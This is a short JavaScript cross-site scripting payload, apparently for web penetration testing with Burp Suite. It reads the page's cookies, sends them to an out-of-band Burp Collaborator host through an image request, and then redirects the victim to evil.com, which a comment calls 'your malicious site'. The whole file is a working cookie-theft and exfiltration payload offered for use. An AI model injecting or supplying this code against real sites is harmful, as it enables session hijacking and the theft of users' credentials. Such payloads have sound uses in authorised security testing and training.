// Display the current domain in an alert
alert("Domain: " + document.domain);

// Fetch the cookies
var cookies = document.cookie;

// Display the cookies in an alert
alert("Cookies: " + cookies);

// Send the cookies to your Burp Collaborator URL
var burpCollaboratorURL = "https://v51ihydl0ib3zxcdzxu2tw3tpkvbj17q.oastify.com"; // Replace with your actual Burp Collaborator URL
var img = new Image();
img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);

// Redirect the victim to another site after 2 seconds
setTimeout(function() {
    window.location.href = "https://evil.com"; // Replace with your malicious site
}, 2000);
